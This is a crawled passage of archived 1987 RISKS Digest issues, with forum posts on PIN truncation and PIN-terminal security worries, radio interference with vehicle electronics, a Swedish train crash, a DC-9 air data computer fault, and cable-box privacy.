This is both correct and not.  The EAN standards actually comprise of two
distinct product coding systems: the EAN-8 and the EAN-13.  The EAN-8 is an
eight-digit no-frills barcode which is encoded only in the "set A" bars.  The
EAN-13 comprises of 13 digits (see, we aren't superstitious over here :-) coded
into a dual barset of 6 digits each.  The 1st digit of the product code is
encoded into the usage of "set A" and "set B" bars in the first barset, and
the last (13th) digit of the barcode is a checksum from the previous 12 digits.
So the EAN-13 barcode looks something like this:
                !!!!!!!!!!!!!!!
                !!!!!!!!!!!!!!!
                !!!!!!!!!!!!!!!
               0!123456!789012!
With the first "0" being the digit encoded into the A/B bars in the first
barset.  The second barset does not contain any coded information in the
usage of bars, it is done simply in "set C".
Why this type of encoding was chosen, beats me!  It is however compatible
with the american UPC coding, since I once tested a bar code reader program
with mixed EAN-codes and UPC-extended codes (you know, the ones you get on
book covers with the price on a little extra barset after the main code).


Also, in RISKS 5.57 Theodore Ts'o writes:
&gt;There is a similar problem with the (Massachusetts) BayBanks teller system:
&gt;it truncates your PIN to FOUR numbers (even though they tell you to pick a
&gt;PIN between four and six numbers).  Yes, it's still there.  When (or if)
&gt;they will ever fix it is unknown.
  Can someone out there in netland tell me how the international PIN system
works (in principle, I'm not expecting the top secret algorithm :-) ?
The cards one gets around here have a 4-digit PIN field in the magnetic stripe
plus one digit of "PIN version".  The PIN system would seem to me to be a
*very* great risk indeed, since as far as I know, the cash registers that can
take a PIN code from a keypad instead of having you sign a sales slip ARE NOT
CONTROLLED ITEMS, ie. I could just go out and buy one.  At least, an organized
and determined group of criminals could steal one.  I would assume that the
part of the cash register that handles PINs works on the "black box" principle,
that is you feed in a card number and what was typed on the keypad and it says
yes or no.  The problem is that a maximum of five digits on the PIN (if we
count the "version" in) would give only 100000 possible codes.  One would not
have to actually reverse-engineer this device (how about calling it a "PIN
Black Box" ?), only use it for testing through the possible keys.
  It's designers would have taken reverse-engineering into account (per the PIN
security requirements), but an attack of this type would be very hard to
counteract in the design criteria, since the actual Black Box has been
obtained, and can be used at leisure for "cracking" card security.
  On the other hand, a determined person with enough technical skill could most
certainly reverse engineer such a device.  A public knowledge of the PIN
algorithms would make stolen/lost credit cards a real disaster, since most of
your money would probably be gone even before you could get to a phone.
Comments, anyone ?

Otto J. Makela, U of Jyvaskyla, Kauppakatu 1 B 18 SF-40100, Jyvaskyla Finland 
voice phone:  +358 41 613 847      BBS phone:      +358 41 211 562

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Computerized Fuel Injection (RISKS DIGEST 5.58)
</A>
</H3>
<address>
&lt;<A HREF="mailto:James_M._Bodwin@um.cc.umich.edu">
James_M._Bodwin@um.cc.umich.edu
</A>&gt;
</address>
<i>
Mon, 16 Nov 87 11:10:44 EST
</i><PRE>

In the mid seventies Volkswagen developed a fuel injection system
for all of their vehicles.  The system has a logic box that that
measures the rate of air flow and then controls valves attached to
the injectors in order to obtain the correct air/fuel mix.
According to the story I heard, the system worked fine in Europe so
they brought a few models over to the US to test out.  For some
unexplained reason the cars would occasionally stall out completely
and fail to restart.  Then, a few seconds later (before thgey could
even get the hood up) the engine would start working again.  This
delayed shipment of the cars to the US market.  After much head
scratching someone finally figured out the problem: CB radio
transmissions from nearby cars were inducing enough current in the
injector control wires to cause the injectors to malfunction.  Of
course, the problem went away as soon as the CB stopped transmitting
or when the car got a reasonable distance away.  The problem was
only noticed in the US because of the relatively large numbers of
CBs in this country (remember the CB craze in the 70s?).  The fix
was to shield the control wires.
 
Unfortunately, this was long enough ago that I can't remember my
original source for this story nor can I verify its accuracy.
 
I don't know enough about the power or frequencies used by CBs and
cellular phones to know whether or not they are significantly
different. However, CBs remain popular enough that I'm surprised
that the car companies haven't already taken sufficient steps to
sheild car electronics from radio transmissions.  Or perhaps they
just designed them to filter out junk in the CB frequencies.

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Re: Password truncation and human interfaces
</A>
</H3>
<address>
Franklin Davis 
&lt;<A HREF="mailto:fad@Think.COM">
fad@Think.COM
</A>&gt;
</address>
<i>
Mon, 16 Nov 87 13:01:36 est
</i><PRE>

   Mark W. Eichin &lt;eichin@ATHENA.MIT.EDU&gt; writes:

   What is especially interesting (in the BayBanks case) is that 
	   2) The screens actually flicker visibly once you have pressed
   the fourth digit, making this feature easy to suspect...
In fact, on the newer machines I can't enter my password at my normal
rate -- the system pauses after the fourth digit, and won't accept the
fifth for a moment.  A poor interface indeed!
                                                     --Franklin

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.58.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.60.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-12</DOCNO>
<DOCOLDNO>IA012-000130-B022-92</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.60.html 128.240.150.127 19970217014200 text/html 21002
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:40:24 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 60</TITLE>
<LINK REL="Prev" HREF="/Risks/5.59.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.61.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.59.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.61.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 60</H1>
<H2> Wednesday 18 November 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Swedish trains collide 
</A>
<DD>
<A HREF="#subj1.1">
Rick Blake
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Hardware and configuration control problem in a DC-9 computer 
</A>
<DD>
<A HREF="#subj2.1">
Nancy Leveson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Ethics, Liability, and Responsibility 
</A>
<DD>
<A HREF="#subj3.1">
Gene Spafford
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Blackhawks and Seahawks 
</A>
<DD>
<A HREF="#subj4.1">
Mike Brown
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Mobile Radio Interference With Vehicles 
</A>
<DD>
<A HREF="#subj5.1">
Peter Mabey
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  VW Fastbacks/RFI/EFI 
</A>
<DD>
<A HREF="#subj6.1">
David Lesher
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  CB frequencies and power 
</A>
<DD>
<A HREF="#subj7.1">
John McLeod
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Signs of the Times 
</A>
<DD>
<A HREF="#subj8.1">
Robert Morris
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  The Mercaptan goes down with the strip 
</A>
<DD>
<A HREF="#subj9.1">
Burch Seymour
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Re: Reach out and (t)ouch 
</A>
<DD>
<A HREF="#subj10.1">
Michael Wagner
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
   Swedish trains collide
</A>
</H3>
<address>
RICK BLAKE (on Essex DEC-10) 
&lt;<A HREF="mailto:rick@ESSEX.AC.UK">
rick@ESSEX.AC.UK
</A>&gt;
</address>
<i>
Wednesday, 18-Nov-87 13:31:53-GMT
</i><PRE>

From The Times, Tuesday 17th November 1987 (reproduced without permission)

    "Gothenburg (AP) - Two Swedish express trains collided at high speed
    in a suburban station at Lerum yesterday, setting a locomotive and
     a carriage on fire and trapping some passengers in the wreckage
    for more than two hours.

    At least nine people were killed and 100 injured. Two carriages
    were so badly twisted that they were sealed shut. The automatic
    system designed to prevent trains from being on the same track
    had apparently been shut off while work was done."

The last sentence points up a possible Risk that has been discussed before
in these columns; what happens when automated systems that are designed to
prevent human error are disabled? Clearly it is too early to draw any
conclusions from this incident until more facts are known, but it is quite
possible that, if the system worked reliably, the train controllers may have
lost familiarity with the manual procedures. Alternatively, perhaps news of
the service withdrawal was not adequately disseminated.  The fact remains
that withdrawal of automated systems may of itself constitute a Risk.

Rick Blake, Computing Service, University of Essex, Wivenhoe Park, COLCHESTER C
+44 206 872778

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Hardware and configuration control problem in a DC-9 computer
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Tue, 17 Nov 87 06:51:08 -0800
From: Nancy Leveson &lt;nancy@commerce.UCI.EDU&gt;

Mike DeWalt of the FAA Certification Office in Seattle sent me a copy of
the Federal Register of August 7, 1987 which contains a notice of a proposed
airworthiness directive, applicable to certain McDonnell Douglas Model
DC-9-81, -82, -83 series airplanes, that would require inspection and
modification, if necessary, of certain Honeywell Digital Air Data Computers
(DADC).  It reports that "This proposal is prompted by reports of
erroneous information being transmitted to the Digital Flight Guidance
Computer from the DADC.  This condition, if not corrected, could lead to
an aircraft stall close to the ground during an automatic pilot or flight
director go-around maneuver."

It goes on to explain in more detail:  "During an automatic go-around
maneuver on a McDonnell Douglas Model DC-9-80 series airplane demonstration
flight for the FAA, a simulated engine loss resulted in an electrical
transient, which caused the Honeywell P/N HG280D80 Digital Air Data
Computer (DADC) to send an erroneous low value of computed air speed to
the Digital Flight Guidance Computer (DFGC).  The DFGC used this value
as a go-around speed reference and generated a large pitch-up command when
it compared the actual airspeed to the erroneous reference airspeed.  The
automatic go-around demonstration was terminated by the pilot when the
stick shaker was activated by the stall warning system."

"Investigations by Honeywell indicated that a complementary metal oxide
semiconductor random access memory chip installed on Microcomputer Circuit
Card Assembly (CCA) A1 could output erroneous computed airspeed, Mach,
and total pressure data, without a failure warning, in the event of a
power interrupt to the DADC.  Modification 8 to the DADC, which consists 
of the addition of a transitor to the circuitry on CCA A1, prevents this 
from occurring.  This transistor had been previously incorporated by
Honeywell as a product improvement on DADC manufactured since May 1983,
but no marking of any kind was put on the DADC to identify it as having
incorporated the transister.  DADC manufactured after February 1987,
however, have the transistor incorporated and the modification is
identified by a Modification 8 marking on the DADC."

The notice goes on to describe the directive which would require 
inspection and modification, if necessary, of the implicated DADC
on -81, -82, and -83 series DC-9s (McDonnell Douglas started inspection
and modification of the DC-9-80 series airplanes in March 1987) within 
12 months of the effective date of the directive.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Ethics, Liability, and Responsibility
</A>
</H3>
<address>
"Gene Spafford" 
&lt;<A HREF="mailto:spaf@purdue.edu">
spaf@purdue.edu
</A>&gt;
</address>
<i>
Tue, 17 Nov 87 11:06:43 EST
</i><PRE>

Sometime in the next few semesters I hope to be offering a seminar
course tentatively entitled "Ethics, Liability, Responsibility and the
Software Engineer."  This course is intended to foster some discussion
about the impact of computer technology on society (for good or bad),
and explore some of the legal and ethical problems involved.

Related to that:

1) The book I've been examining for the primary text should be of
interest to the readers of this forum.  It contains selected essays on
the role of professional ethics (including the full texts of the ACM,
IEEE, and other association codes of ethics), the difficulties with
litigation for computer-related problems, and the role of computers in
"power" systems (economic, political, etc.).  The book is:
	Ethical Issues in the Use of Computers
	D. G. Johnson and J. W. Snapper
	1985, Wadsworth Publishing, Belmont CA
	ISBN 0534-04257-0
The book is available in paperback and I definitely recommend it.

2) I would appreciate suggestions from RISKS readers for other texts,
essays and articles which would be appropriate for such a seminar class.
I hope to compile a reading and resource list for the class, then have
students pick items to study and present to the others.  If you have
any suggestions for such items, I'd appreciate hearing about them;
actual copies would be especially welcome.  I would also welcome
suggestions from anyone who has taught a similar course. You can send
me your suggestions via e-mail (spaf@cs.purdue.edu) or:
	Gene Spafford
	Software Engineering Research Center
	Dept. of Computer Sciences
	Purdue University
	W. Lafayette, IN 47907-2004
Anyone sending me SURFACE MAIL requesting a copy of the resource list
will get a copy sometime in the next academic year when I teach the
class; that may not be until January 1989, so let me know if
you want a partial list sooner.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Blackhawks and Seahawks
</A>
</H3>
<address>
&lt;<A HREF="mailto:mlbrown@nswc-wo.ARPA">
mlbrown@nswc-wo.ARPA
</A>&gt;
</address>
<i>
Mon, 16 Nov 87 16:12:38 est
</i><PRE>

In Risks 5.58, Brint Cooper writes about the EMI problems with the Blackhawk
and asks why the Seahawk has a shielded control module while the Blackhawk
does not.  I suspect that the Seahawk's shielding is a result of the Navy's
stringent testing in the areas of Electromagnetic Vulnerability and EMI.
The Navy's operational environment is generally very "dirty" from the EMI
standpoint with all of the high power radiators aboard the ships.  It is
critical that, during the crucial landing phases on a moving deck, the ship-
board transmitters not interfere with the electronics.  This could be 
accomplished by shutting down the transmitters (EMCON) but this is not
acceptable from an operational standpoint.  Therefore, the helo has to 
withstand this environment.

I rather suspect that the Army's lack of shielding is a pure and simple
weight vs. benefit issue.  If you can save a few pounds in the design of
the system, you have more available payload capacity.  Often this translates
into this kind of a problem.  In order to meet design (e.g. payload) require-
ments, things like "unnecessary" EMI shielding are done away with.  When 
delivered, the helo meets requirements for payload and it's only later that
problems like this surface.  The shielding is added, the usable payload
reduced, and everyone is happy  (well, almost).  Conversely, we can have 
occurrences where the original system may have satisfactorily performed in
high EMI environments but an upgraded system using computers does not.  The
relatively low voltage, rapid response time circuits are sensitive to the
EMI whereas the high voltage, slow response analog circuits did not.  This
is a critical issue that has to be addressed in applications where computers
are used to replace analog controls.
						Mike Brown
[Also noted by "pat" and Henry Spencer.]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Mobile Radio Interference With Vehicles (Re: <A HREF="/Risks/5.58.html">RISKS-5.58</A>)
</A>
</H3>
<address>
Peter Mabey 
&lt;<A HREF="mailto:mcvax!stl.stc.co.uk!phm@uunet.UU.NET">
mcvax!stl.stc.co.uk!phm@uunet.UU.NET
</A>&gt;
</address>
<i>
Wed, 18 Nov 87 10:14:10 GMT
</i><PRE>

&gt;RISKS-LIST: RISKS-FORUM Digest  Sunday, 15 November 1987  Volume 5 : Issue 58
&gt;Subject:       Mobile Radio Interference With Vehicles (<A HREF="/Risks/5.57.html">RISKS-5.57</A>)
&gt;From:          Ian G Batten &lt;BattenIG@CS.BHAM.AC.UK&gt;
&gt;There was some trouble a year or so ago I read of in one of the Car
&gt;magazines with engine management systems on several makes of car...

This reminds me that when the Home Chain of radar stations was being
set up in 1939, it was rumoured that the mysterious transmitting
pylons being constructed were for a secret weapon that would stop the
engines of the German bombers.  There were reports of car engines
unaccountably stalling and refusing to restart till a technician from
an adjacent hut came out, noticed what had happened, and returned
inside.  This was long before electronic engine management, and I
doubt that the pulsed signals would have been able to have the
reported effect on a conventional ignition system, so I suspect that
the reports were 'disinformation' spread to put spies on the wrong
track. (You never heard the stories at first hand, it was something
like ...'our milkman said it happened to a friend')

Peter Mabey  (phm@stl  ...!mcvax!ukc!stl!phm +44-279-29531 x3596)
Standard Technology Ltd., London Road, Harlow, Essex CM17 9NA, U.K.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
VW Fastbacks/RFI/EFI (Re: <A HREF="/Risks/5.59.html">RISKS-5.59</A>)
</A>
</H3>
<address>
David Lesher
&lt;<A HREF="mailto:hadron!netsys!wb8foz@uunet.UU.NET ">
hadron!netsys!wb8foz@uunet.UU.NET 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 18 Nov 87 04:48:39 GMT
Organization: NetSys Public Access Network,Germantown, MD

I remember a VW mechanic across the street from the local gas station the
police frequented asking me why the pancake engine (i.e., Fastbacks+Squareback)
models stalled when the police transmitted. I explained it to him.  This was
on 150 mhz @ 100 watts out. BTW those fuel injection controls were all
discrete transistor...Nobody had heard the words IC-opamp.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
CB frequencies and power
</A>
</H3>
<address>
John McLeod
&lt;<A HREF="mailto:jm7@pyr.gatech.edu ">
jm7@pyr.gatech.edu 
</A>&gt;
</address>
<i>
Wed, 18 Nov 87 15:51:06 EST
</i><PRE>

CB's run at 4 Watts.  Their wavelength is 436 inches.  (~11m).

JOHN MCLEOD         Georgia Insitute of Technology, Atlanta Georgia, 30332
uucp: ...!{akgua,allegra,amd,hplabs,ihnp4,seismo,ut-ngp}!gatech!gitpyr!jm7

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 Signs of the Times [1984? and Information Vending]
</A>
</H3>
<address>
&lt;<A HREF="mailto:RMorris@DOCKMASTER.ARPA">
RMorris@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Tue, 17 Nov 87 15:17 EST
</i><PRE>
To: risks@csl.sri.com

A sign on Route 95 in Delaware to be seen just after passing the toll
booths for the Delaware Memorial Bridge reads "Information Police".

A sign on Route 95 in Pennsylvania just north of the Delaware border
reads "Weather Info Vending Machines".

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
The Mercaptan goes down with the strip
</A>
</H3>
<address>
Burch Seymour
&lt;<A HREF="mailto:sun!gould!augusta!bs@ucbvax.Berkeley.EDU ">
sun!gould!augusta!bs@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Mon, 16 Nov 87 22:02:27 EST
</i><PRE>

[OK, this isn't really computer related, but I thought it might be
interesting as it's sort of high tech related.... and I kept it short too!]

The December 1987 Discovery magazine reports that the Baltimore, Maryland
utility commission sent out their "Energy News" bulletin with a special
addition.  To help promote public recognition they added a scratch and sniff
strip that smelled of mercaptan, the chemical added to natural gas to make
it smell.  Natural gas is odorless; the smell is added as a safety feature
so users can notice potentially explosive leaks. There was a problem. The
smell penetrated the unopened envelopes, causing hundreds of customers to
call the fire department to report gas leaks. "People were panicking at
first. They really thought they were having problems."

The brochures were shelved.

-Burch Seymour-  ...sun!gould!bseymour or something like that

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Re: Reach out and (t)ouch  (RISKS DIGEST 5.58)
</A>
</H3>
<address>
Michael Wagner 
&lt;<A HREF="mailto:WAGNER%DBNGMD21.BITNET@CNUCE-VM.ARPA">
WAGNER%DBNGMD21.BITNET@CNUCE-VM.ARPA
</A>&gt;
</address>
<i>
17 Nov 87 18:48:34
</i><PRE>

&gt; BONN, West Germany - An elderly West German woman ... received a
&gt; whopping telephone bill for $2,3000.

  Wie, bitte?  The number actually printed in the article has some
  sort of problem, since people in North America don't normally
  write a number that way.  I tried to figure out what amount this
  really was.  $23,000 is completely out of line.  If it is $2,300,
  I can't reconcile this with the information in the story (10
  hours) and the rate schedules I have here.  I'm currently trying
  to find out more details of this story.

  [Add to that the fact that 2,3000 auf deutsch is 2.3000 auf englisch.  PGN]

&gt; The meter ran 10 hours.

  To me, this points out the 'brittleness' of some of our
  'high-tech' services.  Older services, like electricity and water
  service, intrinsically limit the amount of resource which can be
  consumed in a short time to some 'small' multiple of the 'normal'
  usage.  This little old woman probably calls her relatives in
  Nairobi once a month for 10 minutes.  For those 10 hours that her
  phone was off the hook, she was responsible for 4000 times her
  normal usage.  I don't think you can get 4000 times normal water
  flow for 10 hours out of your tap, and I don't think you could get
  that much electricity out of the wall without melting your
  entrance fuses.

  I must admit that those limits are the results of physical
  properties that are built into the delivery mechanism (friction in
  the pipes; heating of the wires and fuses in the service
  entrance).  The telephone is somehow 'better' because it doesn't
  have the non-linearities that give rise to these phenomina.
  However, those very non-linearities often serve a useful purpose
  in 'turning back the curve' in situations where a fault has
  occured.

  One hopes, for instance, that if they bring the electricity to the
  house of the future with superconductors, they remember to use
  some 'normalconductors' in the service entrance to limit the total
  possible consumption to reasonable limits, for safety and billing
  reasons.

  Similarly, phone systems and computer systems should contain some
  reasonableness checks to detect outlying situations and alert
  staff to them.

&gt; She then petitioned Parliament, which ruled this week that she
&gt; would have to pay one-third of the bill for carelessness.

  I asked a friend about this; they were surprised that she got off
  so lightly.  It is somewhat unusual that she was 'excused' from
  her full liability.  The telephone system is an incredibly
  powerful institution here in Germany (and more or less in all of
  Europe, I gather).  They do, with alarming regularity, make
  billing mistakes.  And, being a part of the executive branch of
  the government, they have the muscle to make people pay the bills,
  even when the bill is under dispute.

Michael

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.59.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.61.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-13</DOCNO>
<DOCOLDNO>IA012-000130-B022-113</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.61.html 128.240.150.127 19970217014213 text/html 18794
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:40:40 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 61</TITLE>
<LINK REL="Prev" HREF="/Risks/5.60.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.62.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.60.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.62.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 61</H1>
<H2> Wednesday 18 November 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Risks of increased CATV technology 
</A>
<DD>
<A HREF="#subj1.1">
Allan Pratt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Bank networks 
</A>
<DD>
<A HREF="#subj2.1">
David G. Grubbs
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: PIN Verification 
</A>
<DD>
<A HREF="#subj3.1">
John Pershing
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: More on computer security 
</A>
<DD>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Risks of increased CATV technology.  
</A>
</H3>
<address>
Allan Pratt
&lt;<A HREF="mailto:imagen!atari!apratt@ucbvax.Berkeley.EDU ">
imagen!atari!apratt@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Mon, 16 Nov 87 13:23:05 pst
</i><PRE>

I would like to assess the risks of increased CATV technology.  I refer
to addressable converters.  Questions below are asked both for
information and to stimulate thought on this subject:

The cable company serving the community where I live is upgrading their
service to new, addressable converter boxes.  These boxes offer remote
control and time-programmable control to the user, so you can (for
instance) record programs from two different channels at different times
on your VCR.  (Formerly, only one channel could be programmed, because
the channel selector was strictly manual.) The box even reads the time
and date off the air! The box also offers parental lockout of
user-selected channels.  Those are the user-visible benefits. 

The more insidious side of this box is that it can be individually
addressed from any cable company office in the area.  I assume that the
box monitors a frequency band (like the vertical blank interval of the
cable-information channel) and watches for a command tagged with its ID. 
The only commands I know of are "enable/disable channel X." The box also
reads the time and date off the air (!). 

What other commands are available?

How much information can the box transmit back to the host? Can it say
what channel it is tuned to? (Instant ratings.) Can it report how many
times it was tuned to The Playboy Channel? I don't like the idea that a
person or persons unknown will have the opportunity to pass judgement on
my lifestyle like that.  (No, I don't really get the Playboy Channel,
but Showtime has its share of skin flicks.)

The box also has a mute feature.  Advertisers could interrogate this
to see what commercials I was actually listening to.

The Big Picture? This technology threatens to provide instant access to
advertisers and other interested parties to my television viewing
habits, and can even suggest whether or not I am home.  And it can do
all this *remotely* and for *everybody*.  Couple it with laser-scanned
shopping lists and computer-verified checks, and you can match person
with product with commercial-viewing.  The technology already exists
to target one small area with one commercial, and another with another,
and compare the results.

(Of course, I could always go back to broadcast-only TV.  I am not
paranoid enough to do that yet.  I speak of capability (present and
future), not intent.  Still, it does give one pause...

Opinions expressed above do not necessarily	-- Allan Pratt, Atari Corp.
reflect those of Atari Corp. or anyone else.	  ...ames!atari!apratt

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Bank networks
</A>
</H3>
<address>
David G. Grubbs
&lt;<A HREF="mailto:dgg@dandelion.CI.COM ">
dgg@dandelion.CI.COM 
</A>&gt;
</address>
<i>
Tue, 17 Nov 87 14:57:54 est
</i><PRE>

About four years ago I worked on the custom installation of a point-of-sale
(POS) system.  Point-of-Sale terminals are those little slotted boxes
retailers slide your credit card through when you make a credit purchase.

The software we started with was written years before (in assembly language).
Its main component was a scheduler whose job was to "switch" transactions from
